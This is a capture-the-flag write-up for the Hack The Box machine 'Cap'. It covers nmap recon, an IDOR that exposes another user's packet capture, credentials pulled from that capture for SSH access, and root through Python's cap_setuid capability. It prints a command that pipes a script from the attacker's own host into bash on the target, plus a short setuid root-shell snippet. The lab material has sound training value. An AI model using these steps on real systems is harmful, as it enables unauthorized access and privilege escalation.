# Cap Machine

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Linux (Easy)

<img width="1570" height="207" alt="image" src="https://github.com/user-attachments/assets/c30cbb95-69dd-4886-833c-08d05ea67f05" />

## Overview

Cap is an Easy Linux machine on Hack The Box that focuses on identifying an IDOR vulnerability, analyzing network captures, and exploiting Linux capabilities for privilege escalation.

In this write-up, we will:

* Enumerate open services
* Exploit an IDOR vulnerability
* Extract credentials from a PCAP file
* Gain SSH access
* Escalate privileges using Python capabilities

## Tools Used

* Burp Suite
* Nmap
* LinPEAS

## Steps

### 1. Simple Recon

Start the machine and add its IP address to your /etc/hosts file.

Use Nmap to identify the open ports on the machine.

```
nmap -Pn <machine_ip>
```

There are three open ports:

* HTTP
* FTP
* SSH

### 2. Open the Application

I started by opening the web application.

When I navigated to the Security Snapshot (5 Second PCAP + Analysis) section, I noticed that the endpoint changed to /data/1.

I thought this might be an IDOR vulnerability. To test this, I intercepted the request and changed the ID from 1 to 2. 

The application successfully retrieved another user's data, confirming the presence of an IDOR vulnerability.

<img width="1911" height="863" alt="image" src="https://github.com/user-attachments/assets/e62bfe54-b7ce-4a9a-baea-25e9abe7fc3d" />

### 3. Exploiting the IDOR

Initially, I attempted to enumerate IDs from 1 to 5000. However, most requests redirected back to the dashboard.

Since my current capture was stored under ID 1, I decided to test whether previous captures could be accessed. 

Requesting /data/0 successfully returned a PCAP file belonging to another session.

This confirmed the presence of an IDOR vulnerability and provided access to sensitive network traffic.

I downloaded the PCAP file.

### 4. Analyze the PCAP File

I opened the PCAP file using Wireshark and sorted the packets by protocol. 

I immediately found credentials containing a username and password.

I thought these credentials could be used to access either SSH or FTP.

I started with SSH.

<img width="1920" height="487" alt="image" src="https://github.com/user-attachments/assets/fbe001ad-5cb3-4353-b6b8-7ab902f8c6fc" />

### 5. Get the User Flag

Connect via SSH using the discovered credentials.

```
ssh nathan@cap.htb
```

The login was successful.

First, I ran the following commands to determine my current location and view the contents of the directory.

```
pwd
ls
```

I found a file named user.txt.

Display its contents:

```
cat user.txt
```

Finally, we obtain the user flag.

### 6. Privilege Escalation

When I attempted to access the root directory, permission was denied.

<img width="1117" height="187" alt="image" src="https://github.com/user-attachments/assets/d503b769-cdee-478f-897c-41913bf5ab73" />

Now we need to find a way to gain root privileges.

Let's use LinPEAS.

### 7. Using LinPEAS

You can download LinPEAS from GitHub.

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

To run LinPEAS on the target machine, host the script on a simple HTTP server from your attack machine.

```
python3 -m http.server 80
```

Then, on the target machine, download and execute the script:

```
curl http://<your_vpn_ip>/linpeas.sh | bash
```

<img width="1920" height="578" alt="image" src="https://github.com/user-attachments/assets/3c597224-3baf-45dd-9865-951e3004b5e7" />

### 8. Analyze the Results

While reviewing the output, I noticed the following:

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

<img width="1921" height="576" alt="image" src="https://github.com/user-attachments/assets/27472a56-9b7a-44f3-9921-7caad114bbb2" />

This means that Python has the `cap_setuid` capability and can call the `setuid()` function.

Therefore, we can change our UID to `0` (root) and spawn a root shell.

```
import os
os.setuid(0)
os.system("/bin/bash")
```

### 9. Get the Root Flag

Verify that we are running as root:

```
id
```

Success! We now have root privileges.

Navigate to the root directory and locate the root.txt file.

```
cat root.txt
```

Finally, we obtain the root flag.

<img width="1921" height="291" alt="image" src="https://github.com/user-attachments/assets/52ef23a8-0fc4-44ee-af2d-edf8ea4fa6d1" />

#

[The Machine Link](https://app.hackthebox.com/machines/Cap?sort_by=created_at&sort_type=desc)

See you in the next write-up!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
